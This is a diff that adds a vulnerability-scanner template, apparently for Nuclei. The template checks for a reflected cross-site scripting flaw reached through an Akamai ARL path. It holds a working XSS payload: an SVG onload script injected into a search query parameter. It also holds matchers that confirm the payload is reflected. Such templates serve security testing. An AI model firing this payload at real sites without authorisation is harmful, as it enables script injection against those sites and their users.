@@ -1,0 +1,23 @@
+id: Akamai-ARL-Misconfig
+info:
+  name: Akamai ARL Misconfig
+  author: hacktifycs
+  severity: high
+  description: An adversary can perform a XSS by exploiting Akamai ARL 
+  reference: unknown
+  tags: xss
+
+requests:
+  - raw:
+      - |
+        GET /7/0/33/1d/www.citysearch.com/search?what=x&where=place"><svg+onload=confirm(%27xss%27)> HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Language: en
+        Connection: close
+
+    matchers:
+      - type: word
+        words:
+          - "xss"
+          - "Citysearch"
+        condition: and
